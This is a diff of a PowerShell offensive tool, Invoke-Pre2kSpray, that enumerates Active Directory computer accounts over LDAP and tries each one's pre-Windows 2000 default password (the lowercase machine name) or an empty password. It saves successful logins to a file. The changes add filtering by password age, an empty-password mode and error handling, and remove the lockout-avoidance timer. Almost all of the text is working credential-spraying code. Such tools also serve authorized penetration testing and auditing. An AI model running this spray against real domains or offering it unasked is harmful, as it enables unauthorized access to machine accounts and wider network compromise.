@@ -27,6 +27,14 @@ function Invoke-Pre2kSpray
 
     Disables confirmation prompt when enabled
 
+    .PARAMETER Filter
+
+    Filter out accounts that had the password set in the last 30 days (probably normal machine accounts)
+
+    .PARAMETER NoPass
+
+    Try with an empty password
+
     .EXAMPLE
 
     C:\PS> Invoke-Pre2kSpray -OutFile valid-creds.txt -Domain test.local
@@ -48,7 +56,11 @@ function Invoke-Pre2kSpray
 
      [Parameter(Position = 4, Mandatory = $false)]
      [switch]
-     $NoPass
+     $NoPass,
+     
+     [Parameter(Position = 5, Mandatory = $false)]
+     [switch]
+     $Filter = $false
     )
 
     try
@@ -65,6 +77,7 @@ function Invoke-Pre2kSpray
             # Trying to use the current user's domain
             $DomainObject = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
             $CurrentDomain = "LDAP://" + ([ADSI]"").distinguishedName
+            $Domain = $DomainObject.Name
         }
     }
     catch
@@ -75,7 +88,7 @@ function Invoke-Pre2kSpray
 
     Write-Host "[*] Using domain" $CurrentDomain
 
-    $ComputerListArray = Get-DomainComputerList -Domain $Domain -RemoveDisabled -RemovePotentialLockouts -Filter $Filter
+    $ComputerListArray = Get-DomainComputerList -Domain $Domain -FilterByPwdLastSet $Filter
 
     if (!$Force)
     {
@@ -83,7 +96,7 @@ function Invoke-Pre2kSpray
         $message = "Are you sure you want to perform a password spray against " + $ComputerListArray.count + " accounts?"
 
         $yes = New-Object System.Management.Automation.Host.ChoiceDescription "&Yes", `
-            "Attempts to authenticate 1 time per user in the list for each password in the passwordlist file."
+            "Attempts to authenticate 1 time per machine account."
 
         $no = New-Object System.Management.Automation.Host.ChoiceDescription "&No", `
             "Cancels the password spray."
@@ -102,28 +115,20 @@ function Invoke-Pre2kSpray
     Write-Host -ForegroundColor Yellow "[*] Password spraying has beguns"
     Write-Host "[*] This might take a while depending on the total number of computers"
 
-    Invoke-SpraySinglePassword -Domain $CurrentDomain -UserListArray $ComputerListArray -OutFile $OutFile -DomainFQDN $Domain -NoPass $NoPass
-
+    if ($NoPass) 
+    {
+        Invoke-SpraySinglePassword -Domain $CurrentDomain -UserListArray $ComputerListArray -OutFile $OutFile -DomainFQDN $Domain -NoPass
+    }
+    else
+    {
+        Invoke-SpraySinglePassword -Domain $CurrentDomain -UserListArray $ComputerListArray -OutFile $OutFile -DomainFQDN $Domain 
+    }
+    
     Write-Host -ForegroundColor Yellow "[*] Password spraying is complete"
     if ($OutFile -ne "")
     {
         Write-Host -ForegroundColor Yellow "[*] Any passwords that were successfully sprayed have been output to $OutFile"
     }
-}
-
-function Countdown-Timer
-{
-    param(
-        $Seconds = 1800,
-        $Message = "[*] Pausing to avoid account lockout.",
-        [switch] $Quiet = $False
-    )
-    foreach ($Count in (1..$Seconds))
-    {
-        Write-Progress -Id 1 -Activity $Message -Status "Waiting for $($Seconds/60) minutes. $($Seconds - $Count) seconds remaining" -PercentComplete (($Count / $Seconds) * 100)
-        Start-Sleep -Seconds 1
-    }
-    Write-Progress -Id 1 -Activity $Message -Status "Completed" -PercentComplete 100 -Completed
 }
 
 function Get-DomainComputerList
@@ -134,16 +139,8 @@ function Get-DomainComputerList
      $Domain = "",
 
      [Parameter(Position = 1, Mandatory = $false)]
-     [switch]
-     $RemoveDisabled,
-
-     [Parameter(Position = 2, Mandatory = $false)]
-     [switch]
-     $RemovePotentialLockouts,
-
-     [Parameter(Position = 3, Mandatory = $false)]
-     [string]
-     $Filter
+     [bool]
+     $FilterByPwdLastSet
     )
 
     try
@@ -179,16 +176,10 @@ function Get-DomainComputerList
     $DirEntry = New-Object System.DirectoryServices.DirectoryEntry
     $ComputerSearcher.SearchRoot = $DirEntry
 
-    $ComputerSearcher.PropertiesToLoad.Add("samaccountname") > $Null
-    $ComputerSearcher.PropertiesToLoad.Add("badpwdcount") > $Null
-    $ComputerSearcher.PropertiesToLoad.Add("badpasswordtime") > $Null
-
     $ComputerSearcher.filter = "(&(objectClass=computer))"
 
     $ComputerSearcher.PropertiesToLoad.add("samaccountname") > $Null
-    $ComputerSearcher.PropertiesToLoad.add("lockouttime") > $Null
-    $ComputerSearcher.PropertiesToLoad.add("badpwdcount") > $Null
-    $ComputerSearcher.PropertiesToLoad.add("badpasswordtime") > $Null
+    $ComputerSearcher.PropertiesToLoad.add("pwdlastset") > $Null
 
     Write-Host $ComputerSearcher.filter
 
@@ -197,9 +188,24 @@ function Get-DomainComputerList
     $AllComputerObjects = $ComputerSearcher.FindAll()
     $ComputerListArray = @()
 
-    foreach ($user in $AllComputerObjects)
+    Write-Host -ForegroundColor "yellow" ("[*] There are " + $AllComputerObjects.count + " total computers found.")
+
+    if ($FilterByPwdLastSet) 
     {
-        $samaccountname = $user.Properties.samaccountname
+        Write-Host "[*] Looking for accounts with pwdlastset > 30 days ago"
+    }
+
+    foreach ($computer in $AllComputerObjects)
+    {
+        if ($FilterByPwdLastSet)
+        {
+            # skip if filter is active and pwd was last set in the last 30 days 
+            if ([datetime]::FromFileTime([convert]::ToInt64([string]($computer.Properties.pwdlastset)[0])) -gt (Get-Date).adddays(-30))
+            {
+                continue
+            }
+        } 
+        $samaccountname = $computer.Properties.samaccountname
         $ComputerListArray += $samaccountname
     }
 
@@ -222,13 +228,14 @@ function Invoke-SpraySinglePassword
             [string]
             $DomainFQDN,
             [Parameter(Position=5)]
-            [string]
+            [switch]
             $NoPass
     )
     $time = Get-Date
     $count = $UserListArray.count
     Write-Host "[*] Starting pre2k spray against $count computers. Current time is $($time.ToShortTimeString())"
     $curr_user = 0
+    $conn_errors = 0
     if ($OutFile -ne "")
     {
         Write-Host -ForegroundColor Yellow "[*] Writing successes to $OutFile"    
@@ -246,26 +253,38 @@ function Invoke-SpraySinglePassword
         {
             $Password = $Password.Substring(0,14)
         }
-        if ($NoPass -eq "True")
+
+        if ($NoPass)
         {
             $Password = ""
         }
-
-        # Try authenticating
-        $Context = "Domain"
-        $Authtype = "Sealing"
-        $conn = new-object system.directoryservices.accountmanagement.principalcontext($Context, $DomainFQDN, $Authtype)
-
-        # Authenticate using the provided credentials
-        if ($conn.ValidateCredentials($Computer, $Password)) {
-            if ($OutFile -ne "")
-            {
-                Add-Content $OutFile $Computer`:$Password
+      
+        try {
+            $Context = "Domain"
+            $Authtype = "Sealing"
+            $conn = new-object system.directoryservices.accountmanagement.principalcontext($Context, $DomainFQDN, $Authtype)
+            
+            # Authenticate using the provided credentials
+            if ($conn.ValidateCredentials($Computer, $Password)) {
+                if ($OutFile -ne "")
+                {
+                    Add-Content $OutFile $Computer`:$Password
+                }
+                Write-Host -ForegroundColor Green "[*] SUCCESS! Computer:$Computer Password:$Password"
             }
-            Write-Host -ForegroundColor Green "[*] SUCCESS! Computer:$Computer Password:$Password"
-        } 
-        
+        } catch {
+            $conn_errors += 1
+        }
+
         $curr_user += 1
+
+        if ($conn_errors -eq 10 -and $curr_user -eq 10) 
+        {
+            Write-Host -ForegroundColor "red" "[!] 10 out of 10 tries could not connect to" $DomainFQDN
+            Write-Host -ForegroundColor "red" "[!] Exiting"
+            return
+        }
+
         Write-Host -nonewline "$curr_user of $count computers tested`r"
     }
 
